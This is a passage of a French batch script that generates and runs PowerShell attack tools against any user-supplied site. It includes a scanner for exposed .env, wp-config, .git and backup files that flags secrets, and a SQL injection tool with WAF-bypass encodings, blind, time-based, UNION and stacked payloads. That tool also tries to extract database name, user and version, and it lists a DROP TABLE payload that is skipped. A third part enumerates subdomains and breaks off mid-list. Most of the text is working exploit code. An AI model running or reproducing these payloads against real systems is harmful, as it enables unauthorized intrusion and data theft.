echo    '/.env', '/.env.local', '/.env.backup', '/.env.prod', '/.env.dev', >> "%EFS%"
echo    '/config.php', '/config.php.bak', '/configuration.php', '/settings.php', >> "%EFS%"
echo    '/wp-config.php', '/wp-config.php.bak', '/wp-config.php.old', >> "%EFS%"
echo    '/database.yml', '/database.php', '/db.php', '/db_config.php', >> "%EFS%"
echo    '/config.yml', '/config.yaml', '/config.json', '/app.config', >> "%EFS%"
echo    '/secrets.yml', '/credentials.json', '/auth.json', >> "%EFS%"
echo    # Backups >> "%EFS%"
echo    '/backup.zip', '/backup.tar.gz', '/backup.sql', '/dump.sql', >> "%EFS%"
echo    '/site.zip', '/www.zip', '/htdocs.zip', '/public_html.zip', >> "%EFS%"
echo    '/db_backup.sql', '/database.sql', '/mysql.sql', >> "%EFS%"
echo    '/backup/', '/backups/', '/old/', '/archive/', >> "%EFS%"
echo    # Logs >> "%EFS%"
echo    '/error.log', '/error_log', '/access.log', '/debug.log', >> "%EFS%"
echo    '/logs/', '/log/', '/php_errors.log', '/laravel.log', >> "%EFS%"
echo    '/storage/logs/laravel.log', '/app/storage/logs/laravel.log', >> "%EFS%"
echo    # Git/SVN exposes >> "%EFS%"
echo    '/.git/config', '/.git/HEAD', '/.git/COMMIT_EDITMSG', >> "%EFS%"
echo    '/.svn/entries', '/.htpasswd', '/.htaccess', >> "%EFS%"
echo    # Admin / panels >> "%EFS%"
echo    '/admin/', '/admin/login', '/administrator/', '/phpmyadmin/', >> "%EFS%"
echo    '/wp-admin/', '/cpanel/', '/panel/', '/dashboard/', >> "%EFS%"
echo    '/adminer.php', '/adminer/', '/phpinfo.php', '/info.php', >> "%EFS%"
echo    # APIs et tokens >> "%EFS%"
echo    '/api/v1/users', '/api/v1/config', '/api/users', '/api/admin', >> "%EFS%"
echo    '/api/keys', '/api/token', '/v1/users', '/graphql', >> "%EFS%"
echo    # Divers >> "%EFS%"
echo    '/robots.txt', '/sitemap.xml', '/crossdomain.xml', >> "%EFS%"
echo    '/server-status', '/server-info', '/.well-known/security.txt', >> "%EFS%"
echo    '/readme.html', '/README.md', '/CHANGELOG.md', '/composer.json', >> "%EFS%"
echo    '/package.json', '/yarn.lock', '/Gemfile', '/requirements.txt' >> "%EFS%"
echo ) >> "%EFS%"
echo. >> "%EFS%"
echo Write-Host "  Scan de $($paths.Count) chemins sur $url" -f Cyan >> "%EFS%"
echo Write-Host "" >> "%EFS%"
echo. >> "%EFS%"
echo $keywords_secret = @('password','passwd','secret','token','api_key','apikey','private_key','db_pass','smtp_pass','aws_secret','DATABASE_URL','APP_KEY') >> "%EFS%"
echo. >> "%EFS%"
echo foreach ($path in $paths) { >> "%EFS%"
echo    if ($Host.UI.RawUI.KeyAvailable -and $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown').VirtualKeyCode -eq 27) { Write-Host "`n  [!] Annule." -f Red; exit } >> "%EFS%"
echo    $testUrl = $url + $path >> "%EFS%"
echo    try { >> "%EFS%"
echo        $r = Invoke-WebRequest $testUrl -UserAgent $ua -TimeoutSec 6 -ErrorAction Stop -UseBasicParsing -MaximumRedirection 2 >> "%EFS%"
echo        $code = $r.StatusCode >> "%EFS%"
echo        if ($code -eq 200) { >> "%EFS%"
echo            $size = $r.RawContentLength >> "%EFS%"
echo            $snippet = $r.Content.Substring(0, [math]::Min(200, $r.Content.Length)).Replace("`n",' ') >> "%EFS%"
echo            # Detecter si contenu sensible >> "%EFS%"
echo            $hasSensitive = $keywords_secret ^| Where-Object { $r.Content -match $_ } >> "%EFS%"
echo            if ($hasSensitive) { >> "%EFS%"
echo                Write-Host "  [!!!] CRITIQUE : $path ($size bytes)" -f Red >> "%EFS%"
echo                Write-Host "        Mots-cles sensibles detectes : $($hasSensitive -join ', ')" -f Magenta >> "%EFS%"
echo                Write-Host "        Apercu : $($snippet.Substring(0,[math]::Min(120,$snippet.Length)))" -f Yellow >> "%EFS%"
echo            } else { >> "%EFS%"
echo                Write-Host "  [+] ACCESSIBLE : $path ($size bytes)" -f Yellow >> "%EFS%"
echo                Write-Host "      Apercu : $($snippet.Substring(0,[math]::Min(100,$snippet.Length)))" -f DarkGray >> "%EFS%"
echo            } >> "%EFS%"
echo            $found++ >> "%EFS%"
echo        } elseif ($code -eq 403) { >> "%EFS%"
echo            Write-Host "  [~] BLOQUE (403) : $path" -f DarkGray >> "%EFS%"
echo        } >> "%EFS%"
echo    } catch {} >> "%EFS%"
echo } >> "%EFS%"
echo Write-Host "" >> "%EFS%"
echo Write-Host "  Scan termine. $found ressource(s) exposee(s) trouvee(s)." -f Cyan >> "%EFS%"
echo if ($found -gt 0) { >> "%EFS%"
echo    Write-Host "" >> "%EFS%"
echo    Write-Host "  [!] ANALYSE DES RISQUES (Sensible) :" -f Red >> "%EFS%"
echo    Write-Host "  1. Secrets : Les fichiers .env ou wp-config revelent vos passwords DB/API." -f Yellow >> "%EFS%"
echo    Write-Host "  2. Source : Le dossier .git permet de reconstruire TOUT votre code source." -f Yellow >> "%EFS%"
echo    Write-Host "  3. Backups : Les fichiers .sql ou .zip permettent de voler toute votre base." -f Yellow >> "%EFS%"
echo    Write-Host "  CONSEIL : Utilisez un fichier .htaccess ou nginx.conf pour bloquer ces acces." -f Cyan >> "%EFS%"
echo } >> "%EFS%"

powershell -NoProfile -ExecutionPolicy Bypass -File "%EFS%"
if exist "%EFS%" del "%EFS%"
echo.
pause
goto net_cyber_menu

:cyber_sqli_blind
cls
echo.
echo  ===========================================================
echo   INJECTION SQL AVANCEE V2 - BLIND + WAF BYPASS + EXTRACTION
echo  ===========================================================
echo   Nouveau : Test via headers HTTP, WAF bypass encodings,
echo   extraction DB name/user/version, stacked queries,
echo   MSSQL/MySQL/PostgreSQL/SQLite/Oracle.
echo  ===========================================================
echo.
echo  Entrez l'URL cible avec parametre (ex: https://site.com/page?id=1)
set "ALEEX_SQLI_URL="
set /p "ALEEX_SQLI_URL=URL : "
if not defined ALEEX_SQLI_URL goto net_cyber_menu

set "SBS=%TEMP%\sqli_blind.ps1"
if exist "%SBS%" del /f /q "%SBS%"

echo $url = $env:ALEEX_SQLI_URL >> "%SBS%"
echo if ($url -notmatch '^^http') { $url = 'http://' + $url } >> "%SBS%"
echo $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" >> "%SBS%"
echo $vulns = 0 >> "%SBS%"
echo $waf_detected = $false >> "%SBS%"
echo. >> "%SBS%"
echo # Extraire les parametres >> "%SBS%"
echo $uri = [uri]$url >> "%SBS%"
echo $q = $uri.Query.TrimStart('?') >> "%SBS%"
echo $params = $q.Split('^&', [System.StringSplitOptions]::RemoveEmptyEntries) >> "%SBS%"
echo if ($params.Count -eq 0) { Write-Host "  [!] Aucun parametre GET detecte dans l'URL." -f Red; exit } >> "%SBS%"
echo Write-Host "  [i] Parametres detectes : $($params -join ', ')" -f Cyan >> "%SBS%"
echo Write-Host "" >> "%SBS%"
echo. >> "%SBS%"
echo function Inject-Param { >> "%SBS%"
echo    param($baseUrl, $param, $payload) >> "%SBS%"
echo    $key = $param.Split('=')[0] >> "%SBS%"
echo    $encoded = [uri]::EscapeDataString($payload) >> "%SBS%"
echo    return $baseUrl -replace "$key=[^^&]*", "$key=$encoded" >> "%SBS%"
echo } >> "%SBS%"
echo.
echo function Get-Response { >> "%SBS%"
echo    param($testUrl, $headers = @{}) >> "%SBS%"
echo    try { >> "%SBS%"
echo        if ($headers.Count -gt 0) { >> "%SBS%"
echo            $r = Invoke-WebRequest $testUrl -UserAgent $ua -Headers $headers -TimeoutSec 10 -ErrorAction Stop -UseBasicParsing >> "%SBS%"
echo        } else { >> "%SBS%"
echo            $r = Invoke-WebRequest $testUrl -UserAgent $ua -TimeoutSec 10 -ErrorAction Stop -UseBasicParsing >> "%SBS%"
echo        } >> "%SBS%"
echo        return @{ Code=$r.StatusCode; Length=$r.RawContentLength; Content=$r.Content } >> "%SBS%"
echo    } catch { return @{ Code=0; Length=0; Content="" } } >> "%SBS%"
echo } >> "%SBS%"
echo. >> "%SBS%"
echo # WAF Detection initiale >> "%SBS%"
echo Write-Host "  [PRE] Detection WAF/IDS..." -f DarkGray >> "%SBS%"
echo $wafPayload = [char]39 + ' OR 1=1--'
echo $wafUrl = Inject-Param $url $params[0] $wafPayload >> "%SBS%"
echo $wafR = Get-Response $wafUrl >> "%SBS%"
echo if ($wafR.Code -in 403,406,419,429,503) { >> "%SBS%"
echo    Write-Host "  [!] WAF/IPS detecte (HTTP $($wafR.Code)) - Utilisation des bypass encodings" -f Yellow >> "%SBS%"
echo    $script:waf_detected = $true >> "%SBS%"
echo } elseif ($wafR.Content -match 'blocked^|forbidden^|not allowed^|firewall^|security^|waf') { >> "%SBS%"
echo    Write-Host "  [!] WAF detecte via message HTML" -f Yellow >> "%SBS%"
echo    $script:waf_detected = $true >> "%SBS%"
echo } else { >> "%SBS%"
echo    Write-Host "  [OK] Pas de WAF detecte en surface" -f Green >> "%SBS%"
echo } >> "%SBS%"
echo. >> "%SBS%"
echo # Payloads WAF bypass si WAF detecte >> "%SBS%"
echo $bypassEncodings = if ($script:waf_detected) { >> "%SBS%"
echo    @( >> "%SBS%"
echo        { param($p) $p },                                          # Normal >> "%SBS%"
echo        { param($p) $p.Replace(' ', '/**/') },                     # Comment bypass >> "%SBS%"
echo        { param($p) $p.Replace(' ', '%%20') },                      # URL encoded space >> "%SBS%"
echo        { param($p) $p.Replace(' ', '+') },                        # Plus space >> "%SBS%"
echo        { param($p) $p.Replace("'", "%%27") },                      # URL encoded quote >> "%SBS%"
echo        { param($p) [uri]::EscapeDataString([uri]::EscapeDataString($p)) } # Double URL encode >> "%SBS%"
echo    ) >> "%SBS%"
echo } else { >> "%SBS%"
echo    @({ param($p) $p }) >> "%SBS%"
echo } >> "%SBS%"
echo.
echo foreach ($param in $params) { >> "%SBS%"
echo    $key = $param.Split('=')[0] >> "%SBS%"
echo    Write-Host "  =============================" -f Cyan >> "%SBS%"
echo    Write-Host "  Parametre : [$key]" -f Cyan >> "%SBS%"
echo    Write-Host "  =============================" -f Cyan >> "%SBS%"
echo. >> "%SBS%"
echo    $base = Get-Response $url >> "%SBS%"
echo    $baseLen = $base.Length >> "%SBS%"
echo    Write-Host "  Baseline : $baseLen bytes (HTTP $($base.Code))" -f Gray >> "%SBS%"
echo. >> "%SBS%"
echo    # TEST 1 : Boolean-based blind avec WAF bypass >> "%SBS%"
echo    Write-Host "  [1/6] Boolean-based blind SQLi..." -f Yellow >> "%SBS%"
echo    $truePayloads  = @( >> "%SBS%"
echo        "1 AND 1=1--", >> "%SBS%"
echo        "1' AND '1'='1'--", >> "%SBS%"
echo        "1 AND 1=1\#", >> "%SBS%"
echo        "1 AND 1=1/*", >> "%SBS%"
echo        "1' AND '1'='1' AND '1'='1", >> "%SBS%"
echo        "1 OR 1=1--", >> "%SBS%"
echo        "1) AND (1=1--", >> "%SBS%"
echo        "1')) AND ((1=1--" >> "%SBS%"
echo    ) >> "%SBS%"
echo    $falsePayloads = @( >> "%SBS%"
echo        "1 AND 1=2--", >> "%SBS%"
echo        "1' AND '1'='2'--", >> "%SBS%"
echo        "1 AND 1=2\#", >> "%SBS%"
echo        "1 AND 1=2/*", >> "%SBS%"
echo        "1' AND '1'='2' AND '1'='2", >> "%SBS%"
echo        "1 OR 1=2--", >> "%SBS%"
echo        "1) AND (1=2--", >> "%SBS%"
echo        "1')) AND ((1=2--" >> "%SBS%"
echo    ) >> "%SBS%"
echo    for ($i = 0; $i -lt $truePayloads.Count; $i++) { >> "%SBS%"
echo        foreach ($enc in $bypassEncodings) { >> "%SBS%"
echo            $tPayload = ^& $enc $truePayloads[$i] >> "%SBS%"
echo            $fPayload = ^& $enc $falsePayloads[$i] >> "%SBS%"
echo            $trueUrl  = Inject-Param $url $param $tPayload >> "%SBS%"
echo            $falseUrl = Inject-Param $url $param $fPayload >> "%SBS%"
echo            $trueR  = Get-Response $trueUrl >> "%SBS%"
echo            $falseR = Get-Response $falseUrl >> "%SBS%"
echo            $diff = [math]::Abs($trueR.Length - $falseR.Length) >> "%SBS%"
echo            if ($trueR.Length -eq $baseLen -and $diff -gt 50) { >> "%SBS%"
echo                Write-Host "  [VULN] Boolean-based detectee ! TRUE=$($trueR.Length)b FALSE=$($falseR.Length)b (diff=$diff)" -f Red >> "%SBS%"
echo                Write-Host "         Payload TRUE  : $($truePayloads[$i])" -f Magenta >> "%SBS%"
echo                $vulns++; break >> "%SBS%"
echo            } >> "%SBS%"
echo        } >> "%SBS%"
echo    } >> "%SBS%"
echo. >> "%SBS%"
echo    # TEST 2 : Time-based blind (multi-DB + WAF bypass) >> "%SBS%"
echo    Write-Host "  [2/6] Time-based blind (MySQL/MSSQL/PostgreSQL/SQLite/Oracle)..." -f Yellow >> "%SBS%"
echo    $timePayloads = @( >> "%SBS%"
echo        @{P="1' AND SLEEP(4)--";       DB="MySQL"}, >> "%SBS%"
echo        @{P="1 AND SLEEP(4)--";        DB="MySQL (no quote)"}, >> "%SBS%"
echo        @{P="1; WAITFOR DELAY '0:0:4'--"; DB="MSSQL"}, >> "%SBS%"
echo        @{P="1'; WAITFOR DELAY '0:0:4'--"; DB="MSSQL (quote)"}, >> "%SBS%"
echo        @{P="1' AND pg_sleep(4)--";    DB="PostgreSQL"}, >> "%SBS%"
echo        @{P="1 AND pg_sleep(4)--";     DB="PostgreSQL (no quote)"}, >> "%SBS%"
echo        @{P="1' AND 1=(SELECT 1 FROM (SELECT SLEEP(4))x)--"; DB="MySQL subquery"}, >> "%SBS%"
echo        @{P="1 OR SLEEP(4)--";         DB="MySQL OR"}, >> "%SBS%"
echo        @{P="1' OR SLEEP(4)--";        DB="MySQL OR (quote)"}, >> "%SBS%"
echo        @{P="1 AND 1=1 AND SLEEP(4)--"; DB="MySQL chain"}, >> "%SBS%"
echo        @{P="1'; SELECT SLEEP(4)--";   DB="MySQL stacked"}, >> "%SBS%"
echo        @{P="1'; SELECT pg_sleep(4)--"; DB="PostgreSQL stacked"}, >> "%SBS%"
echo        @{P="1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',4)--"; DB="Oracle"} >> "%SBS%"
echo    ) >> "%SBS%"
echo    foreach ($tp in $timePayloads) { >> "%SBS%"
echo        foreach ($enc in $bypassEncodings) { >> "%SBS%"
echo            $tPayload = ^& $enc $tp.P >> "%SBS%"
echo            $tUrl = Inject-Param $url $param $tPayload >> "%SBS%"
echo            $start = Get-Date >> "%SBS%"
echo            $null = Get-Response $tUrl >> "%SBS%"
echo            $elapsed = ((Get-Date) - $start).TotalSeconds >> "%SBS%"
echo            if ($elapsed -gt 3.5) { >> "%SBS%"
echo                Write-Host "  [VULN] Time-based detectee ! DB:$($tp.DB) Delai:$([math]::Round($elapsed,1))s" -f Red >> "%SBS%"
echo                Write-Host "         Payload : $($tp.P)" -f Magenta >> "%SBS%"
echo                $vulns++; break >> "%SBS%"
echo            } >> "%SBS%"
echo        } >> "%SBS%"
echo        if ($Host.UI.RawUI.KeyAvailable -and $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown').VirtualKeyCode -eq 27) { Write-Host "`n  [!] Annule." -f Red; exit } >> "%SBS%"
echo    } >> "%SBS%"
echo. >> "%SBS%"
echo    # TEST 3 : Error-based (multi-DB) >> "%SBS%"
echo    Write-Host "  [3/6] Error-based (MySQL/MSSQL/Oracle/PostgreSQL)..." -f Yellow >> "%SBS%"
echo    $errPayloads = @( >> "%SBS%"
echo        [char]39, [char]34, "1')", "1'--", "1'#", "1''", >> "%SBS%"
echo        "1 AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--", >> "%SBS%"
echo        "1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", >> "%SBS%"
echo        "1; SELECT 1/0--", >> "%SBS%"
echo        "1' AND 1=CONVERT(int,'a')--", >> "%SBS%"
echo        "1' AND 1=(SELECT TOP 1 table_name FROM information_schema.tables)--", >> "%SBS%"
echo        "1 UNION SELECT NULL,NULL,NULL,NULL,@@version--", >> "%SBS%"
echo        "1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7162786271,(SELECT (ELT(1=1,1))),0x71706a7671))s), 8446744073709551610, 8446744073709551610)))--" >> "%SBS%"
echo    ) >> "%SBS%"
echo    $errKeywords = @( >> "%SBS%"
echo        'sql syntax','mysql','sqlite','syntax error','ORA-','PostgreSQL', >> "%SBS%"
echo        'Microsoft OLE','ODBC','JDBC','Warning.*mysqli','You have an error', >> "%SBS%"
echo        'supplied argument','Incorrect syntax','Unclosed quotation', >> "%SBS%"
echo        'quoted string not properly','SQLSTATE','DB Error', >> "%SBS%"
echo        'java.sql.','System.Data.SqlClient','Microsoft Access', >> "%SBS%"
echo        'SQLiteException','Zend_Db','ADODB','pg_query', >> "%SBS%"
echo        'PDOException','DBD::','unterminated quoted string' >> "%SBS%"
echo    ) >> "%SBS%"
echo    foreach ($ep in $errPayloads) { >> "%SBS%"
echo        $eUrl = Inject-Param $url $param $ep >> "%SBS%"
echo        $eR = Get-Response $eUrl >> "%SBS%"
echo        $hit = $errKeywords ^| Where-Object { $eR.Content -match $_ } >> "%SBS%"
echo        if ($hit) { >> "%SBS%"
echo            Write-Host "  [VULN] Error-based detectee ! Mot-cle : $($hit[0])" -f Red >> "%SBS%"
echo            Write-Host "         Payload : $ep" -f Magenta >> "%SBS%"
echo            # Essai d'extraction version >> "%SBS%"
echo            $versionPayloads = @( >> "%SBS%"
echo                "1 AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--", >> "%SBS%"
echo                "1' UNION SELECT @@version--", >> "%SBS%"
echo                "1 UNION SELECT @@version,NULL--" >> "%SBS%"
echo            ) >> "%SBS%"
echo            foreach ($vp in $versionPayloads) { >> "%SBS%"
echo                $vUrl = Inject-Param $url $param $vp >> "%SBS%"
echo                $vR = Get-Response $vUrl >> "%SBS%"
echo                if ($vR.Content -match '(\d+\.\d+\.\d+[-\w]*)') { >> "%SBS%"
echo                    Write-Host "  [INFO] Version DB extraite : $($matches[1])" -f Yellow >> "%SBS%"
echo                    break >> "%SBS%"
echo                } >> "%SBS%"
echo            } >> "%SBS%"
echo            $vulns++; break >> "%SBS%"
echo        } >> "%SBS%"
echo    } >> "%SBS%"
echo. >> "%SBS%"
echo    # TEST 4 : UNION-based avec extraction >> "%SBS%"
echo    Write-Host "  [4/6] UNION-based (detection + extraction DB/user)..." -f Yellow >> "%SBS%"
echo    $unionFound = $false >> "%SBS%"
echo    for ($cols = 1; $cols -le 15; $cols++) { >> "%SBS%"
echo        $nulls = ('NULL,' * $cols).TrimEnd(',') >> "%SBS%"
echo        $uPayload = "1 UNION SELECT $nulls--" >> "%SBS%"
echo        $uUrl = Inject-Param $url $param $uPayload >> "%SBS%"
echo        $uR = Get-Response $uUrl >> "%SBS%"
echo        if ($uR.Code -eq 200 -and $uR.Length -ne $baseLen) { >> "%SBS%"
echo            Write-Host "  [VULN] UNION fonctionne avec $cols colonne(s) !" -f Red >> "%SBS%"
echo            $vulns++; $unionFound = $true >> "%SBS%"
echo            # Tentative extraction infos critiques >> "%SBS%"
echo            Write-Host "  Tentative extraction DB name / user / version..." -f DarkGray >> "%SBS%"
echo            $extractPayloads = @( >> "%SBS%"
echo                "1 UNION SELECT $((('database(),' * $cols).TrimEnd(',')))--", >> "%SBS%"
echo                "1 UNION SELECT $((('user(),' * $cols).TrimEnd(',')))--", >> "%SBS%"
echo                "1 UNION SELECT $((('@@version,' * $cols).TrimEnd(',')))--", >> "%SBS%"
echo                "1 UNION SELECT $((('current_database(),' * $cols).TrimEnd(',')))--" >> "%SBS%"
echo            ) >> "%SBS%"
echo            foreach ($ep in $extractPayloads) { >> "%SBS%"
echo                $exUrl = Inject-Param $url $param $ep >> "%SBS%"
echo                $exR = Get-Response $exUrl >> "%SBS%"
echo                if ($exR.Length -ne $baseLen -and $exR.Content.Length -gt 10) { >> "%SBS%"
echo                    $diff_content = $exR.Content -replace $uR.Content, '' -replace '\s+',' ' >> "%SBS%"
echo                    if ($diff_content.Length -gt 3) { >> "%SBS%"
echo                        Write-Host "  [DATA] Donnee extraite (peut contenir nom DB/user) detectee" -f Magenta >> "%SBS%"
echo                        break >> "%SBS%"
echo                    } >> "%SBS%"
echo                } >> "%SBS%"
echo            } >> "%SBS%"
echo            break >> "%SBS%"
echo        } >> "%SBS%"
echo    } >> "%SBS%"
echo    if (-not $unionFound) { Write-Host "  [ ] UNION pas concluant sur ce parametre" -f DarkGray } >> "%SBS%"
echo. >> "%SBS%"
echo    # TEST 5 : Stacked Queries >> "%SBS%"
echo    Write-Host "  [5/6] Stacked Queries (MSSQL/PostgreSQL/MySQL 5.5+)..." -f Yellow >> "%SBS%"
echo    $stackedPayloads = @( >> "%SBS%"
echo        @{P="1; SELECT SLEEP(3)--";     DB="MySQL"}, >> "%SBS%"
echo        @{P="1'; SELECT SLEEP(3)--";    DB="MySQL (quote)"}, >> "%SBS%"
echo        @{P="1; WAITFOR DELAY '0:0:3'--"; DB="MSSQL"}, >> "%SBS%"
echo        @{P="1'; WAITFOR DELAY '0:0:3'--"; DB="MSSQL (quote)"}, >> "%SBS%"
echo        @{P="1; SELECT pg_sleep(3)--";  DB="PostgreSQL"}, >> "%SBS%"
echo        @{P="1; SELECT 1--";            DB="Generic"}, >> "%SBS%"
echo        @{P="1; DROP TABLE IF EXISTS sqlitest--"; DB="Generic destructive (simulee)"} >> "%SBS%"
echo    ) >> "%SBS%"
echo    foreach ($sp in $stackedPayloads) { >> "%SBS%"
echo        if ($sp.DB -match 'destructive') { continue } # Skip destructive in auto mode >> "%SBS%"
echo        $sUrl = Inject-Param $url $param $sp.P >> "%SBS%"
echo        $start = Get-Date >> "%SBS%"
echo        $sR = Get-Response $sUrl >> "%SBS%"
echo        $elapsed = ((Get-Date) - $start).TotalSeconds >> "%SBS%"
echo        if ($elapsed -gt 2.5) { >> "%SBS%"
echo            Write-Host "  [VULN] Stacked Query possible ! DB:$($sp.DB) Delai:$([math]::Round($elapsed,1))s" -f Red >> "%SBS%"
echo            $vulns++; break >> "%SBS%"
echo        } >> "%SBS%"
echo    } >> "%SBS%"
echo. >> "%SBS%"
echo    # TEST 6 : SQLi via headers HTTP >> "%SBS%"
echo    Write-Host "  [6/6] SQLi via headers HTTP (User-Agent, X-Forwarded-For, Referer)..." -f Yellow >> "%SBS%"
echo    $sqliHeaders = @('User-Agent','X-Forwarded-For','X-Forwarded-Host','X-Real-IP','Referer','Accept-Language','Cookie') >> "%SBS%"
echo    $hdrPayloads = @( >> "%SBS%"
echo        ([char]39 + ' OR 1=1--'), >> "%SBS%"
echo        ([char]39 + ' AND SLEEP(3)--'), >> "%SBS%"
echo        "1 UNION SELECT NULL--", >> "%SBS%"
echo        ([char]39 + ') OR ('+[char]39+'1'+[char]39+'='+[char]39+'1') >> "%SBS%"
echo    ) >> "%SBS%"
echo    foreach ($hdr in $sqliHeaders) { >> "%SBS%"
echo        foreach ($hp in $hdrPayloads) { >> "%SBS%"
echo            try { >> "%SBS%"
echo                $hTest = @{$hdr = $hp} >> "%SBS%"
echo                $start = Get-Date >> "%SBS%"
echo                $hR = Invoke-WebRequest $url -Headers $hTest -UserAgent $ua -TimeoutSec 8 -EA SilentlyContinue -UseBasicParsing >> "%SBS%"
echo                $elapsed = ((Get-Date) - $start).TotalSeconds >> "%SBS%"
echo                if ($hR -and ($errKeywords ^| Where-Object { $hR.Content -match $_ })) { >> "%SBS%"
echo                    Write-Host "  [VULN] SQLi error via header $hdr !" -f Red >> "%SBS%"
echo                    $vulns++; break >> "%SBS%"
echo                } >> "%SBS%"
echo                if ($elapsed -gt 2.5) { >> "%SBS%"
echo                    Write-Host "  [VULN] SQLi time-based via header $hdr (delai:$([math]::Round($elapsed,1))s) !" -f Red >> "%SBS%"
echo                    $vulns++; break >> "%SBS%"
echo                } >> "%SBS%"
echo            } catch {} >> "%SBS%"
echo        } >> "%SBS%"
echo    } >> "%SBS%"
echo. >> "%SBS%"
echo } >> "%SBS%"
echo Write-Host "" >> "%SBS%"
echo Write-Host "  ================================================" -f Cyan >> "%SBS%"
echo if ($vulns -gt 0) { >> "%SBS%"
echo    Write-Host "  [!!!] $vulns vulnerabilite(s) SQLi detectee(s) !" -f Red >> "%SBS%"
echo    Write-Host "" >> "%SBS%"
echo    Write-Host "  [!] ANALYSE DES RISQUES (SQLi) :" -f Red >> "%SBS%"
echo    Write-Host "  1. Vol de donnees : Acces complet a la base (users, passwords, CB)." -f Yellow >> "%SBS%"
echo    Write-Host "  2. Prise de controle : Possibilite de modifier les admins ou bypass le login." -f Yellow >> "%SBS%"
echo    Write-Host "  3. RCE (Execute OS) : Risque de prise de controle du serveur via la DB." -f Yellow >> "%SBS%"
echo    Write-Host "" >> "%SBS%"
echo    Write-Host "  Recommandations :" -f Cyan >> "%SBS%"
echo    Write-Host "    1. Utilisez des requetes preparees (Prepared Statements)" -f Green >> "%SBS%"
echo    Write-Host "    2. Validez et echappez toutes les entrees utilisateur" -f Green >> "%SBS%"
echo    Write-Host "    3. Appliquez le principe du moindre privilege sur la DB" -f Green >> "%SBS%"
echo    Write-Host "    4. Activez un WAF (ModSecurity, Cloudflare...)" -f Green >> "%SBS%"
echo } else { >> "%SBS%"
echo    Write-Host "  [OK] Aucune SQLi detectee sur les parametres testes." -f Green >> "%SBS%"
echo    Write-Host "" >> "%SBS%"
echo    Write-Host "  [i] NOTE : Cela ne garantit pas l'absence totale de faille." -f DarkGray >> "%SBS%"
echo    Write-Host "      Utilisez sqlmap pour une analyse en profondeur." -f DarkGray >> "%SBS%"
echo } >> "%SBS%"
echo Write-Host "  ================================================" -f Cyan >> "%SBS%"

powershell -NoProfile -ExecutionPolicy Bypass -File "%SBS%"
if exist "%SBS%" del "%SBS%"
echo.
pause
goto net_cyber_menu

:cyber_subdomain_scan
cls
echo.
echo  ===========================================================
echo   SCAN SOUS-DOMAINES ET ENDPOINTS CACHES
echo  ===========================================================
echo   Identifie la surface d'attaque en trouvant
echo   les sous-domaines et API du site cible.
echo.
echo  Entrez le domaine cible (ex: monsite.com)
set "ALEEX_SUBDOM_DOMAIN="
set /p "ALEEX_SUBDOM_DOMAIN=Domaine : "
if not defined ALEEX_SUBDOM_DOMAIN goto net_cyber_menu

set "SSS=%TEMP%\subdomain_scan.ps1"
if exist "%SSS%" del /f /q "%SSS%"

echo $domain = $env:ALEEX_SUBDOM_DOMAIN >> "%SSS%"
echo $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" >> "%SSS%"
echo $found = 0 >> "%SSS%"
echo. >> "%SSS%"
echo # === PARTIE 1 : Sous-domaines === >> "%SSS%"
echo Write-Host "  [1/2] Scan des sous-domaines courants..." -f Blue >> "%SSS%"
echo $subdomains = @( >> "%SSS%"
echo    'www','mail','smtp','pop','imap','ftp','sftp','ssh', >> "%SSS%"
echo    'dev','test','staging','preprod','prod','demo','beta', >> "%SSS%"
echo    'admin','panel','dashboard','portal','intranet','extranet', >> "%SSS%"
echo    'api','api2','api-v1','api-v2','rest','graphql','ws', >> "%SSS%"
echo    'static','cdn','assets','media','img','images','files', >> "%SSS%"
echo    'docs','wiki','support','help','kb','status','monitor', >> "%SSS%"
echo    'vpn','remote','access','secure','ssl','auth','login', >> "%SSS%"
echo    'git','gitlab','github','jenkins','ci','cd','build','deploy', >> "%SSS%"
echo    'jira','confluence','redmine','trello','slack', >> "%SSS%"
echo    'mysql','pgsql','db','database','redis','mongo','elastic', >> "%SSS%"
echo    'old','backup','archive','legacy','v1','v2','new', >> "%SSS%"
echo    'webmail','mail2','ns1','ns2','mx','mx1','smtp2' >> "%SSS%"
echo ) >> "%SSS%"
echo. >> "%SSS%"
echo foreach ($sub in $subdomains) { >> "%SSS%"
echo    $fqdn = "$sub.$domain" >> "%SSS%"
echo    try { >> "%SSS%"
echo        $resolved = [System.Net.Dns]::GetHostAddresses($fqdn) >> "%SSS%"
echo        if ($resolved) { >> "%SSS%"
echo            $ip = $resolved[0].IPAddressToString >> "%SSS%"
echo            Write-Host "  [+] $fqdn -> $ip" -f Green -NoNewline >> "%SSS%"
echo            # Tenter HTTP/HTTPS >> "%SSS%"
echo            foreach ($scheme in @('https','http')) { >> "%SSS%"
echo                try { >> "%SSS%"
echo                    $r = Invoke-WebRequest "$scheme`://$fqdn" -UserAgent $ua -TimeoutSec 5 -ErrorAction Stop -UseBasicParsing -MaximumRedirection 3 >> "%SSS%"
echo                    Write-Host " [$scheme $($r.StatusCode)]" -f Cyan -NoNewline >> "%SSS%"
echo                    # Detecter technologie >> "%SSS%"
echo                    if ($r.Headers['Server']) { Write-Host " Server:$($r.Headers['Server'])" -f Yellow -NoNewline } >> "%SSS%"
echo                    if ($r.Headers['X-Powered-By']) { Write-Host " Powered:$($r.Headers['X-Powered-By'])" -f Yellow -NoNewline } >> "%SSS%"
echo                    break >> "%SSS%"
echo                } catch {} >> "%SSS%"
echo            } >> "%SSS%"
echo            Write-Host "" >> "%SSS%"
echo            $found++ >> "%SSS%"
echo        } >> "%SSS%"
echo    } catch {} >> "%SSS%"
echo } >> "%SSS%"
echo. >> "%SSS%"
echo # === PARTIE 2 : Endpoints caches === >> "%SSS%"
echo Write-Host "" >> "%SSS%"
echo Write-Host "  [2/2] Scan des endpoints caches sur https://$domain..." -f Blue >> "%SSS%"
echo $endpoints = @( >> "%SSS%"
echo    '/api', '/api/v1', '/api/v2', '/api/v3', >> "%SSS%"
echo    '/swagger', '/swagger-ui', '/swagger-ui.html', '/swagger.json', '/openapi.json', >> "%SSS%"
echo    '/graphql', '/graphiql', '/altair', >> "%SSS%"
